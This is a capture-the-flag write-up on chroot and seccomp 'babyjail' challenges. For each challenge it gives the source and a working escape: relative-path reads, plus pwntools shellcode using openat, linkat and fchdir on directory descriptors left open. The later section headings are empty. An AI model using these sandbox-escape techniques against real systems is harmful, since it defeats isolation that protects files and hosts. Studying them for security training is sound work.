# filesystem sandboxing
## chroot-escape-basic
```C
int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    assert(argc > 1);

    char jail_path[] = "/tmp/jail-XXXXXX";
    assert(mkdtemp(jail_path) != NULL);

    printf("Creating a jail at `%s`.\n", jail_path);

    assert(chroot(jail_path) == 0);

    int fffd = open("/flag", O_WRONLY | O_CREAT);
    write(fffd, "FLAG{FAKE}", 10);
    close(fffd);

    printf("Sending the file at `%s` to stdout.\n", argv[1]);
    sendfile(1, open(argv[1], 0), 0, 128);
}
```
The program expects a file to open inside the jail, but as the program does not change the directory after chroot, we can still read the file using relative file path to flag.
```bash
./babyjail_level1 ../flag
```
## chroot-shellcode
```C
int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    assert(argc > 1);

    assert(strstr(argv[1], "flag") == NULL);

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
    if (fd < 0)
        printf("Failed to open the file located at `%s`.\n", argv[1]);
    else
        printf("Successfully opened the file located at `%s`.\n", argv[1]);

    char jail_path[] = "/tmp/jail-XXXXXX";
    assert(mkdtemp(jail_path) != NULL);

    printf("Creating a jail at `%s`.\n", jail_path);

    assert(chroot(jail_path) == 0);

    int fffd = open("/flag", O_WRONLY | O_CREAT);
    write(fffd, "FLAG{FAKE}", 10);
    close(fffd);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);
    printf("Mapped 0x1000 bytes for shellcode at %p!\n", shellcode);

    puts("Reading 0x1000 bytes of shellcode from stdin.\n");
    int shellcode_size = read(0, shellcode, 0x1000);

    puts("This challenge is about to execute the following shellcode:\n");
    print_disassembly(shellcode, shellcode_size);
    puts("");

    puts("Executing shellcode!\n");

    ((void(*)())shellcode)();
```
This program does also does not change the directory to jail but also expects a shellcode from the user. We can generate a shellcode to read the relative file "../flag" using shellcraft:
```python
from pwn import *
context.arch = "amd64"
with open("shellcode.bin", "wb") as file:
	file.write(asm(shellcraft.amd64.linux.cat("../flag")))
```
and executing the program as:
```bash
/challenge/babyjail_level2 test < shellcode.bin
```
## chroot-proper
```C
#define _GNU_SOURCE 1

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    assert(argc > 1);

    assert(strstr(argv[1], "flag") == NULL);

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
    if (fd < 0)
        printf("Failed to open the file located at `%s`.\n", argv[1]);
    else
        printf("Successfully opened the file located at `%s`.\n", argv[1]);

    char jail_path[] = "/tmp/jail-XXXXXX";
    assert(mkdtemp(jail_path) != NULL);

    printf("Creating a jail at `%s`.\n", jail_path);

    assert(chroot(jail_path) == 0);

    puts("Moving the current working directory into the jail.\n");
    assert(chdir("/") == 0);

    int fffd = open("/flag", O_WRONLY | O_CREAT);
    write(fffd, "FLAG{FAKE}", 10);
    close(fffd);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);
    printf("Mapped 0x1000 bytes for shellcode at %p!\n", shellcode);

    puts("Reading 0x1000 bytes of shellcode from stdin.\n");
    int shellcode_size = read(0, shellcode, 0x1000);

    puts("This challenge is about to execute the following shellcode:\n");
    print_disassembly(shellcode, shellcode_size);
    puts("");

    puts("Executing shellcode!\n");

    ((void(*)())shellcode)();
}
```
The program opens `argv[1]` before call to chroot but does not close it. we can abuse this behavior by asking the program to open the root directory `"/"` and then use `openat()` function to open relative "flag" to this directory, effectively opening `"/flag"` outside the jail.

We can use pwntool's shellcraft to write shellcode.
```python
from pwn import *

context.arch = "amd64"
context.os = "linux"

code = '''
_start:
    call pwn
    .string "flag"
pwn:
	# openat(3, "flag", 0): opens "/flag"
    mov rax, 0x101
    mov rdi, 3
    mov rsi, [rsp]
    mov rdx, 0
    syscall
	# sendfile(1, rax, 0, 0x1000)
    mov rdi, 1
    mov rsi, rax
    mov rdx, 0
    mov r10, 0x1000
    mov rax, 0x28
    syscall
'''

print(disasm(asm(code)))
with open("/tmp/shellcode.bin", "wb") as shellcode:
    shellcode.write(asm(code))
```
We can send the shell-code by calling the program like, where `"/"` is the directory we will open:
```bash
/challenge/babyjail_level3 / < /tmp/shellcode.bin
```

# seccomp
## seccomp-basic
Escape a chroot sandbox using shell-code, but this time only using the following syscalls: ["openat", "read", "write", "sendfile"]
We can use the same exploit as the the last challenge, as we read the flag using only `openat` and `sendfile`.
```bash
$ /challenge/babyjail_level4 "/" < /tmp/shellcode.bin
```
## seccomp-linkat
Escape a chroot sandbox using shell-code, but this time only using the following syscalls: ["linkat", "open", "read", "write", "sendfile"]
We can create a hard-link of the flag file, in the same directory. we can then launch the program again and ask the program to open the hard-link to bypass the flag file restriction to open the file. first shell-code will create a hard-link and the second shell-code will use send-file to write the file content to the screen.
```python
from pwn import *

context.arch = "amd64"
context.os = "linux"

code_one = '''
_start:
    // linkat(3, "flag", 3, "galf", 0)
    call one
    .string "flag"
one:
    mov rsi, [rsp]
    call two
    .string "galf"

two:
    mov r10, [rsp]
    mov rdi, 3
    mov rdx, 3
    xor r8, r8

call:
    mov rax, 0x109
    syscall
'''

code_two = '''
_start:
    // sendfile(1, 3, 0, 0x100)
    xor rdi, rdi
    inc rdi
    mov rsi, 3
    xor rdx, rdx
    mov r10, 0x100
    mov rax, 0x28
    syscall
'''

print(disasm(asm(code_one)))
print(disasm(asm(code_two)))
with open("/tmp/one.bin", "wb") as shellcode:
    shellcode.write(asm(code_one))

with open("/tmp/two.bin", "wb") as shellcode:
    shellcode.write(asm(code_two))

```
We can now call the program like:
```bash
/challenge/babyjail_level5 "/" < /tmp/one.bin
```
This will create the file "/galf" and we can read it using our second shell-code:
```bash
/challenge/babyjail_level5 "/galf" < /tmp/two.bin
```
## seccomp-fchdir
Escape a chroot sandbox using shell-code, but this time only using the following syscalls: ["fchdir", "open", "read", "write", "sendfile"]
This program creates a jail and `chdir's` to the new jail. The program:
- will open a file/directory of our choice and not close it.
- allows the use of `fchdir` which is used to change directory by specifying an open file/directory's file descriptor.

This implies that we can escape from the jail by `fchdir`-ing back to `/`.
Shell-code for this challenge:
```python
from pwn import *

context.arch = "amd64"
context.os = "linux"

code = '''
_start:
    // fchdir(3)
    mov rdi, 3
    mov rax, 0x51
    syscall
    call pwn
    .string "./flag"
pwn:
    // open("flag", 0)
    mov rdi, [rsp]
    mov rsi, 0
    xor rdx, rdx
    mov rax, 2
    syscall
    // sendfile(1, rax, 0, 0x100)
    mov rdi, 1
    mov rsi, rax
    mov rdx, 0
    mov r10, 0x100
    mov rax, 0x28
    syscall
'''

print(disasm(asm(code)))
with open("/tmp/shellcode.bin", "wb") as shellcode:
    shellcode.write(asm(code))
```
## seccomp-rechroot
## seccomp-only
## seccomp-arch32
## seccomp-minimal
## seccomp-timebased
## seccomp-readonly
## process-isolation

